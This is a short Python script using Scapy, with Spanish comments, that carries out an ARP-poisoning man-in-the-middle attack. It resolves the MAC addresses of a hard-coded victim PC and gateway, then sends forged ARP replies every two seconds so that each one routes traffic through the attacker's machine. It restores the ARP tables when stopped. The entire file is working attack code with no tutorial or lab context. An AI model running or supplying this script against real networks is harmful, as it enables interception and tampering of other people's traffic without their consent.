#!/usr/bin/env python3
from scapy.all import *
import time

victima_ip = "192.168.10.12"      # IP de la PC víctima
gateway_ip = "192.168.10.1"        # IP del router/puerta de enlace
mi_mac = "50:fc:89:00:05:00"      # Tu MAC (la del atacante)

def obtener_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    # Enviamos y esperamos respuesta
    respuesta = srp(arp_request, timeout=2, verbose=0)[0]
    return respuesta[0][1].hwsrc  # Extraemos la MAC de la respuesta

def envenenar_arp(victima_ip, victima_mac, objetivo_ip, objetivo_mac):
    
    paquete = ARP(
        op=2,                    
        psrc=objetivo_ip,        
        hwsrc=mi_mac,            
        pdst=victima_ip,         
        hwdst=victima_mac        
    )
    
    send(paquete, verbose=0)
    print(f"[+] Enviado: {objetivo_ip} es ahora {mi_mac} (a {victima_ip})")

def restaurar_arp(victima_ip, victima_mac, objetivo_ip, objetivo_mac):
    """Restaura las tablas ARP originales al salir"""
    paquete = ARP(
        op=2,
        psrc=objetivo_ip,
        hwsrc=objetivo_mac,      
        pdst=victima_ip,
        hwdst=victima_mac
    )
    send(paquete, count=5, verbose=0)
    print("[+] Tablas ARP restauradas")

print("[*] Obteniendo MACs...")
victima_mac = obtener_mac(victima_ip)
gateway_mac = obtener_mac(gateway_ip)
print(f"[*] Víctima: {victima_ip} -> {victima_mac}")
print(f"[*] Gateway: {gateway_ip} -> {gateway_mac}")

try:
    print("[*] Iniciando envenenamiento ARP (Ctrl+C para detener)...")
    while True:
        envenenar_arp(victima_ip, victima_mac, gateway_ip, mi_mac)
        envenenar_arp(gateway_ip, gateway_mac, victima_ip, mi_mac)
        time.sleep(2)  # Reenviamos cada 2 segundos para mantener el envenenamiento
        
except KeyboardInterrupt:
    print("\n[*] Deteniendo y restaurando...")
    restaurar_arp(victima_ip, victima_mac, gateway_ip, gateway_mac)
    restaurar_arp(gateway_ip, gateway_mac, victima_ip, victima_mac)